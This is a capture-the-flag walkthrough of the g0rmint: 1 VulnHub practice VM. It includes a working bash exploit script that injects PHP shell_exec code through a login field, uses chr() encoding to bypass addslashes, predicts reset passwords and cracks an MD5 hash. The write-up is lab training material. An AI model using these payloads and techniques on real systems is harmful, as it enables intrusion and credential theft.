---
layout: post
title: "Will the real Gormint Aunty please stand up?"
comments: true
category: walkthrough
tags: [vulnhub, g0rmint]
---

**Spoiler Alert**  
This post documents the complete walkthrough of g0rmint: 1, a boot2root [VM][1] hosted at [VulnHub][2]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

### Background

The Gormint Aunty is a social media sensation made famous by her "_yeh bik gai hai gormint_" rant to a news reporter. In other words, she's got the balls to say it like it is. :sunglasses:

### Information Gathering

Let's kick this off with a `nmap` scan to establish the services available in the host:  
`# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.198.130`

```
PORT STATE SERVICE REASON VERSION
22/tcp open ssh syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 2048 e4:4e:fd:98:4e:ae:5d:0c:1d:32:e8:be:c4:5b:28:d9 (RSA)
|_ 256 9b:48:29:39:aa:f5:22:d3:6e:ae:52:23:2a:ae:d1:b2 (ECDSA)
80/tcp open http syn-ack ttl 64 Apache httpd 2.4.18
| http-methods:
|_ Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry
|_/g0rmint/*
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: 404 Not Found
```

Let's start with the web service since there is a disallowed entry `/g0rmint/*` in `robots.txt`. Here's what I see in the browser when I navigate to it.

![robots.txt](/assets/images/posts/g0rmint-walkthrough/g0rmint-3.png)

![login.php](/assets/images/posts/g0rmint-walkthrough/g0rmint-1.png)

### Directory/File Enumeration

Let's enumerate the site with `dirbuster` and see what we get.

![dirbuster](/assets/images/posts/g0rmint-walkthrough/g0rmint-2.png)

```
File found: /g0rmint/config.php - 200
File found: /g0rmint/footer.php - 200
File found: /g0rmint/header.php - 200
File found: /g0rmint/login.php - 200
File found: /g0rmint/mainmenu.php - 200
File found: /g0rmint/reset.php - 200
File found: /g0rmint/dummy.php - 302
File found: /g0rmint/index.php - 302
File found: /g0rmint/logout.php - 302
File found: /g0rmint/profile.php - 302
File found: /g0rmint/secrets.php - 302
```

Among the PHP pages, we can disregard those that returned **302** (because they got redirected back to `/login.php`) and those that returned nothing of value. Only the following pages were interesting:

* `/header.php`
* `/login.php`
* `/mainmenu.php`
* `/reset.php`

Let's explore each page in turn in reverse order starting with `/reset.php`.

### Password Reset Page `/reset.php`

Well, the page looked like your normal password reset page. If you know the email address and the username, you'll be able to reset the password.

![reset.php](/assets/images/posts/g0rmint-walkthrough/g0rmint-8.png)

At this point in time, I'm not aware of any email address or username :sob:

### Menu Page `/mainmenu.php`

This page appeared interesting on the surface but it was the HTML source code that offered a clue on how to proceed.

![mainmenu.php](/assets/images/posts/g0rmint-walkthrough/g0rmint-4.png)

Here's the source code. Noticed that `/secretlogfile.php` was commented out?

![mainmenu.php](/assets/images/posts/g0rmint-walkthrough/g0rmint-5.png)

Navigating to the page got me redirected back to `/login.php`. No luck there. However, it gave me the idea to look at the HTML source code closer for further hints.

### Login Page `/login.php`

Indeed, if you look very closely at the HTML source code of `/login.php`, there was something that stood out.

![login.php](/assets/images/posts/g0rmint-walkthrough/g0rmint-6.png)

A secret backup directory??!!

### Header Page `/header.php`

This page appeared to contain the headers of the admin portal. The admin's full name was also hardcoded at the dropdown menu - **Noman Riffat.**

![header.php](/assets/images/posts/g0rmint-walkthrough/g0rmint-9.png)

Looking at the HTML source code of this page, one of the CSS proved interesting - `style.css`:

```
/*
* Author: noman
* Author Email: w3bdrill3r@gmail.com
* Version: 1.0.0
* g0rmint: Bik gai hai
* Copyright: Aunty g0rmint
* www: http://g0rmint.com
* Site managed and developed by author himself
*/
```

Could this be the email address and the username of the admin? Well, there is a high chance looking at the name on the header page.

### Directory/File Enumeration - Part 2

Taking a leaf from the previous enumeration with `dirbuster`, let's give it another shot starting with this path: `/g0rmint/s3cretbackupdirect0ry`.

```
File found: /g0rmint/s3cretbackupdirect0ry/info.php - 200
```

Good. One more page made available.

### Information Page `/info.php`

This page proved to be an really informative one.

![info.php](/assets/images/posts/g0rmint-walkthrough/g0rmint-7.png)

### Backup Archive `/backup.zip`

The backup archive can be downloaded at `http://192.168.198.130/g0rmint/s3cretbackupdirect0ry/backup.zip`

```
# unzip -l backup.zip 
Archive:  backup.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2017-11-02 14:36   s3cr3t-dir3ct0ry-f0r-l0gs/
        0  2017-11-02 03:06   s3cretbackupdirect0ry/
      823  2017-11-02 20:22   config.php
     1251  2017-11-02 20:30   db.sql
      493  2017-11-02 17:01   deletesecretlogfile.php
      154  2017-11-02 17:01   dummy.php
       45  2017-11-02 00:46   footer.php
     5721  2017-11-01 23:45   header.php
     1986  2017-11-01 18:48   index.php
     7426  2017-11-02 17:00   login.php
       99  2017-11-02 17:02   logout.php
      847  2017-11-01 19:02   mainmenu.php
     5113  2017-11-02 17:02   profile.php
     7343  2017-11-02 14:39   reset.php
     2587  2017-11-03 14:22   secretlogfile.php
     2065  2017-11-01 23:42   secrets.php
        0  2017-11-01 18:19   css/
    22111  2014-05-16 21:10   css/bootstrap-responsive.css
    16849  2014-05-16 21:10   css/bootstrap-responsive.min.css
   127247  2014-05-16 21:10   css/bootstrap.css
   105939  2014-05-16 21:10   css/bootstrap.min.css
    14185  2014-05-16 21:10   css/chosen.css
    29647  2014-05-16 21:10   css/elfinder.min.css
     1825  2014-05-16 21:10   css/elfinder.theme.css
    25255  2014-05-16 21:10   css/font-awesome-ie7.min.css
    15736  2014-05-16 21:10   css/font-awesome.min.css
    11106  2014-10-17 18:41   css/fullcalendar.css
    52911  2014-05-16 21:10   css/glyphicons.css
    20684  2014-05-16 21:10   css/halflings.css
     2189  2014-05-16 21:10   css/ie.css
      298  2014-05-16 21:10   css/ie9.css
    33247  2014-05-16 21:10   css/jquery-ui-1.8.21.custom.css
     1394  2014-05-16 21:10   css/jquery.cleditor.css
     2242  2014-05-16 21:10   css/jquery.gritter.css
     3867  2014-05-16 21:10   css/jquery.iphone.toggle.css
     2116  2014-05-16 21:10   css/jquery.noty.css
     8752  2014-05-16 21:10   css/noty_theme_default.css
    18475  2014-05-16 21:10   css/style-forms.css
     8257  2014-10-17 21:09   css/style-responsive.css
    65321  2017-11-02 00:43   css/style.css
    10598  2014-05-16 21:10   css/uniform.default.css
     2660  2014-01-13 17:31   css/uploadfilemulti.css
     2452  2014-05-16 21:10   css/uploadify.css
        0  2017-11-01 18:19   font/
    25395  2014-05-16 21:10   font/fontawesome-webfont-0.eot
    25395  2014-05-16 21:10   font/fontawesome-webfont-62877.eot
    55096  2014-05-16 21:10   font/fontawesome-webfont-62877.ttf
    29380  2014-05-16 21:10   font/fontawesome-webfont-62877.woff
   146026  2014-05-16 21:10   font/glyphicons-regular-0.eot
   146026  2014-05-16 21:10   font/glyphicons-regular.eot
   257772  2014-05-16 21:10   font/glyphicons-regular.svg
   145672  2014-05-16 21:10   font/glyphicons-regular.ttf
    90916  2014-05-16 21:10   font/glyphicons-regular.woff
    33358  2014-05-16 21:10   font/glyphiconshalflings-regular-0.eot
    33358  2014-05-16 21:10   font/glyphiconshalflings-regular.eot
    51353  2014-05-16 21:10   font/glyphiconshalflings-regular.svg
    32896  2014-05-16 21:10   font/glyphiconshalflings-regular.ttf
    18944  2014-05-16 21:10   font/glyphiconshalflings-regular.woff
        0  2017-11-01 23:51   img/
      201  2014-05-16 21:10   img/arrows-active.png
      312  2014-05-16 21:10   img/arrows-normal.png
     3432  2014-10-17 17:11   img/avatar.jpg
      143  2014-05-16 21:10   img/bg-input-focus.png
      143  2014-05-16 21:10   img/bg-input.png
    62686  2014-05-16 21:10   img/bg-login.jpg
     3028  2014-05-16 21:10   img/browser-chrome-big.png
     3136  2014-05-16 21:10   img/browser-firefox-big.png
     1492  2014-05-16 21:10   img/browser-ie.png
     1113  2014-05-16 21:10   img/browser-opera.png
     1573  2014-05-16 21:10   img/browser-safari.png
     3064  2014-05-16 21:10   img/buttons.gif
      257  2014-05-16 21:10   img/chat-left-metro.png
      402  2014-05-16 21:10   img/chat-left-metro@2x.png
      491  2014-05-16 21:10   img/chat-left.png
      805  2014-05-16 21:10   img/chat-left@2x.png
      259  2014-05-16 21:10   img/chat-right-metro.png
      420  2014-05-16 21:10   img/chat-right-metro@2x.png
      587  2014-05-16 21:10   img/chat-right.png
      912  2014-05-16 21:10   img/chat-right@2x.png
      559  2014-05-16 21:10   img/chosen-sprite.png
      264  2014-05-16 21:10   img/close-button-white.png
      494  2014-05-16 21:10   img/close-button.png
      329  2014-05-16 21:10   img/crop.gif
    16515  2014-05-16 21:10   img/dialogs.png
    27723  2017-11-01 23:50   img/g0rmint.jpg
        0  2017-11-01 18:19   img/gallery/
   168657  2014-05-16 21:10   img/gallery/photo1.jpg
   185030  2014-05-16 21:10   img/gallery/photo10.jpg
    88730  2014-05-16 21:10   img/gallery/photo11.jpg
   142112  2014-05-16 21:10   img/gallery/photo12.jpg
   206235  2014-05-16 21:10   img/gallery/photo13.jpg
    54820  2014-05-16 21:10   img/gallery/photo2.jpg
   196127  2014-05-16 21:10   img/gallery/photo3.jpg
   173525  2014-05-16 21:10   img/gallery/photo4.jpg
    54244  2014-05-16 21:10   img/gallery/photo5.jpg
   118323  2014-05-16 21:10   img/gallery/photo6.jpg
   100509  2014-05-16 21:10   img/gallery/photo7.jpg
   205368  2014-05-16 21:10   img/gallery/photo8.jpg
    85705  2014-05-16 21:10   img/gallery/photo9.jpg
     8777  2014-05-16 21:10   img/glyphicons-halflings-white.png
    13826  2014-05-16 21:10   img/glyphicons-halflings.png
   147941  2014-05-16 21:10   img/glyphicons-white.png
   339812  2014-05-16 21:10   img/glyphicons-white.svg
   173275  2014-05-16 21:10   img/glyphicons.png
   325320  2014-05-16 21:10   img/glyphicons.svg
    18321  2014-05-16 21:10   img/glyphicons_halflings-white.png
    67304  2014-05-16 21:10   img/glyphicons_halflings-white.svg
    23254  2014-05-16 21:10   img/glyphicons_halflings.png
    68324  2014-05-16 21:10   img/glyphicons_halflings.svg
    35425  2014-05-16 21:10   img/icons-big.png
     7365  2014-05-16 21:10   img/icons-small.png
        0  2017-11-01 18:19   img/iphone-style-checkboxes/
     2577  2014-05-16 21:10   img/iphone-style-checkboxes/off-63584.png
     2496  2014-05-16 21:10   img/iphone-style-checkboxes/on-63584.png
      260  2014-05-16 21:10   img/iphone-style-checkboxes/slider_center-63584.png
      324  2014-05-16 21:10   img/iphone-style-checkboxes/slider_left-63584.png
      321  2014-05-16 21:10   img/iphone-style-checkboxes/slider_right-63584.png
     1727  2014-05-16 21:10   img/progress.gif
       78  2014-05-16 21:10   img/quicklook-bg.png
     2647  2014-05-16 21:10   img/quicklook-icons.png
      667  2014-05-16 21:10   img/quote.png
      101  2014-05-16 21:10   img/resize.png
      240  2014-05-16 21:10   img/slider_r8.png
     1849  2014-05-16 21:10   img/spinner-mini.gif
    34229  2014-05-16 21:10   img/sprite.png
      151  2014-05-16 21:10   img/timeline-bg.png
      645  2014-05-16 21:10   img/timeline-left-arrow.png
     1084  2014-05-16 21:10   img/timeline-left-arrow@2x.png
      767  2014-05-16 21:10   img/timeline-right-arrow.png
     1016  2014-05-16 21:10   img/timeline-right-arrow@2x.png
       68  2014-05-16 21:10   img/toolbar.gif
    17160  2014-05-16 21:10   img/toolbar.png
      180  2014-05-16 21:10   img/ui-bg_flat_0_aaaaaa_40x100.png
      178  2014-05-16 21:10   img/ui-bg_flat_75_ffffff_40x100.png
      120  2014-05-16 21:10   img/ui-bg_glass_55_fbf9ee_1x400.png
      105  2014-05-16 21:10   img/ui-bg_glass_65_ffffff_1x400.png
      111  2014-05-16 21:10   img/ui-bg_glass_75_dadada_1x400.png
      110  2014-05-16 21:10   img/ui-bg_glass_75_e6e6e6_1x400.png
      119  2014-05-16 21:10   img/ui-bg_glass_95_fef1ec_1x400.png
      101  2014-05-16 21:10   img/ui-bg_highlight-soft_75_cccccc_1x100.png
     4369  2014-05-16 21:10   img/ui-icons_222222_256x240.png
     4369  2014-05-16 21:10   img/ui-icons_2e83ff_256x240.png
     4369  2014-05-16 21:10   img/ui-icons_454545_256x240.png
     4369  2014-05-16 21:10   img/ui-icons_888888_256x240.png
     4369  2014-05-16 21:10   img/ui-icons_cd0a0a_256x240.png
     2960  2014-05-16 21:10   img/uploadify-cancel.png
        0  2017-11-01 18:19   js/
    26570  2015-05-17 22:43   js/bootbox.js
    61752  2014-05-16 21:10   js/bootstrap.js
    28538  2014-05-16 21:10   js/bootstrap.min.js
     1838  2014-05-16 21:10   js/counter.js
    81057  2015-05-23 20:57   js/custom.js
    41784  2014-05-16 21:10   js/excanvas.js
    49962  2014-05-16 21:10   js/fullcalendar.min.js
    92629  2014-05-16 21:10   js/jquery-1.9.1.min.js
     6911  2014-05-16 21:10   js/jquery-migrate-1.0.0.min.js
   227259  2014-05-16 21:10   js/jquery-ui-1.10.0.custom.min.js
    22939  2014-05-16 21:10   js/jquery.chosen.min.js
    12047  2014-05-16 21:10   js/jquery.cleditor.min.js
     1941  2014-05-16 21:10   js/jquery.cookie.js
    70742  2014-05-16 21:10   js/jquery.dataTables.min.js
   134069  2014-05-16 21:10   js/jquery.elfinder.min.js
    10123  2015-05-20 13:49   js/jquery.fileuploadmulti.min.js
   107204  2014-05-16 21:10   js/jquery.flot.js
    21932  2014-05-16 21:10   js/jquery.flot.pie.js
     1239  2014-05-16 21:10   js/jquery.flot.resize.min.js
     6968  2014-05-16 21:10   js/jquery.flot.stack.js
    43892  2015-05-20 13:47   js/jquery.form.js
     4242  2014-05-16 21:10   js/jquery.gritter.min.js
     3354  2014-05-16 21:10   js/jquery.imagesloaded.js
     9922  2014-05-16 21:10   js/jquery.iphone.toggle.js
    17692  2014-05-16 21:10   js/jquery.knob.modified.js
     5467  2014-05-16 21:10   js/jquery.masonry.min.js
     8385  2014-05-16 21:10   js/jquery.noty.js
     7549  2014-05-16 21:10   js/jquery.raty.min.js
    44541  2014-05-16 21:10   js/jquery.sparkline.min.js
     4593  2014-05-16 21:10   js/jquery.ui.touch-punch.js
     7739  2014-05-16 21:10   js/jquery.uniform.min.js
    46268  2014-05-16 21:10   js/jquery.uploadify-3.1.min.js
     5541  2014-05-16 21:10   js/modernizr.js
     1326  2014-05-16 21:10   js/retina.js
---------                     -------
  6183823                     181 files
```

Sweet. The archive appears to be the backup of the site.

### Resetting Password

Suffice to say, the most obvious thing to try would be to look at `db.sql` for the admin credentials. Unfortunately. the credentials `(demo@example.com:demo)` did not work.

![db.sql](/assets/images/posts/g0rmint-walkthrough/g0rmint-16.png)

Since the site backup is available, let's take a look at the password reset mechanism and see if we can gain access into the site by resetting password.

![reset.php](/assets/images/posts/g0rmint-walkthrough/g0rmint-12.png)

All we have to do is to guess the email address and username. And, the "new" password would be the first 20 characters from the SHA1 hash of the current GMT date/time. :smirk:

Another advantage given to us was the current GMT date/time loaded at the bottom of the password reset page.

Let's give a shot to `(email:w3bdrill3r@gmail.com)` and `(username:noman)` and see what we get.

![reset.php](/assets/images/posts/g0rmint-walkthrough/g0rmint-14.png)

I wrote a script to simplify the process of getting the "new" password in plaintext:

```bash
# cat reset.sh
#!/bin/bash

echo -n "$1" | sha1sum | cut -d' ' -f1 | cut -c1-20

# ./reset.sh "Friday 2nd of February 2018 02:08:53 PM"
30e1a63a8968b727f276
```
![access](/assets/images/posts/g0rmint-walkthrough/g0rmint-13.png)

The password reset worked. Awesome!

### Remote Command Execution

Now that I've gain access to the g0rmint Admin Portal, this is also a good time to review the application source code and determine our attack vector.

At the beginning of `/login.php`, it was possible to introduce PHP code of my choice into the site through the `addlog()` function.

![addlog](/assets/images/posts/g0rmint-walkthrough/g0rmint-10.png)

This is how the `addlog()` function in `/config.php` looked like:

![addlog](/assets/images/posts/g0rmint-walkthrough/g0rmint-11.png)

When authentication has failed, the value of the email field gets logged to a PHP file at `s3cr3t-dir3ct0ry-f0r-l0gs`, in the format of `"Y-m-d".php`, where `"Y"` is the 4-digit year, `"m"` is the 2-digit month with a leading zero and `"d"` is the 2-digit day with a leading zero. However, an authenticated session must first be established before the PHP file can be viewed or you'll get redirected to the login page. This is because the contents of `dummy.php` was written at the top of the file.

![dummy.php](/assets/images/posts/g0rmint-walkthrough/g0rmint-19.png)

I wrote a `bash` script to automate remote command execution as follows:

```bash
# cat exploit.sh
#!/bin/bash

HOST=192.168.198.130
BASE=g0rmint
SECRET=s3cr3t-dir3ct0ry-f0r-l0gs

EMAIL=$1
PASS=$2
COMD=$3

# authenticate
function authenticate() {
  curl \
    -s \
    -c cookie \
    -d "email=$EMAIL&pass=$PASS&submit=submit" \
    http://$HOST/$BASE/login.php &>/dev/null
}

# encode
function encode() {
  for b in $(echo -n "$1" | xxd -p | sed -r 's/(..)/\1 /g'); do
    printf "chr(%d)\n" "0x$b"
  done | tr '\n' '.' | sed 's/.$//g'
  echo
}

# exploit
function exploit() {
  PAYLOAD=$(encode "$COMD")
  DATE=$(date "+%Y-%m-%d")
  curl \
    -s \
    -b cookie \
    http://$HOST/$BASE/deletesecretlogfile.php?file=$DATE.php &>/dev/null
  curl \
    -s \
    --data "email=<?php echo shell_exec($PAYLOAD);?>&pass=&submit=submit" \
    http://$HOST/$BASE/login.php &>/dev/null
  curl \
    -s \
    -b cookie \
    http://$HOST/$BASE/$SECRET/$DATE.php | \
    sed -e 's/Failed login attempt detected with email: //' -e 's/<br>//g' | \
    sed '1d' | sed '$d'
}

# main()
authenticate
exploit

# remove cookie jar
rm -rf cookie
```

The real workhorse of the script is the `encode()` function. This function turns each ASCII characters of the command string into their ordinals. Each ordinal will go into the `chr()` function and concatenate back as a string. This is to bypass `addslashes()` that was present in `config.php`.

![addslashes](/assets/images/posts/g0rmint-walkthrough/g0rmint-15.png)

Simply supply the email, password and command as arguments and the script would display out the output. For example:

```
# ./exploit.sh w3bdrill3r@gmail.com 30e1a63a8968b727f276 "cat /etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
g0rmint:x:1000:1000:Noman Riffat,,,:/home/g0rmint:/bin/bash
mysql:x:108:117:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin
```

### Backup Archive `/backup.zip` - Part 2

During enumeration, I spotted the presence of another `backup.zip` at `/var/www`:

```
/var/www:
total 3672
drwxr-xr-x  3 root     root        4096 Nov  3 02:51 .
drwxr-xr-x 12 root     root        4096 Nov  2 03:42 ..
-rw-r--r--  1 root     root     3747496 Nov  3 02:43 backup.zip
drwxr-xr-x  3 www-data www-data    4096 Nov  3 04:08 html
```

I helped myself to the file by copying it to the web root like so:

```
# ./exploit.sh w3bdrill3r@gmail.com 30e1a63a8968b727f276 "cp /var/www/backup.zip /var/www/html"
```

Next, I downloaded the file using `wget`.

```
# wget http://192.168.198.130/backup.zip
--2018-02-02 14:46:19-- http://192.168.198.130/backup.zip
Connecting to 192.168.198.130:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3747496 (3.6M) [application/zip]
Saving to: ‘backup.zip’

backup.zip 100%[==================================>] 3.57M --.-KB/s in 0.1s

2018-02-02 14:46:19 (27.6 MB/s) - ‘backup.zip’ saved [3747496/3747496]
```

It appeared to be just like the previous `backup.zip` with a twist. This time round, `db.sql` showed the original admin password hash!

![db.sql](/assets/images/posts/g0rmint-walkthrough/g0rmint-17.png)

The password was revealed to be `"tayyab123"` after going through an online MD5 [cracker][3].

### SSH Login

Let's try using the credentials `(g0rmint:tayyab123)` for a low-privilege shell.

![g0rmint](/assets/images/posts/g0rmint-walkthrough/g0rmint-18.png)

Awesome!

### Privilege Escalation

Noticed that `g0rmint` has successfully `sudo`'d as `root`?

![sudo](/assets/images/posts/g0rmint-walkthrough/g0rmint-20.png)

I sensed the end is near...

![end](/assets/images/posts/g0rmint-walkthrough/g0rmint-21.png)

:dancer:

[1]: https://www.vulnhub.com/entry/g0rmint-1,214/
[2]: https://www.vulnhub.com/
[3]: http://md5decrypt.net/
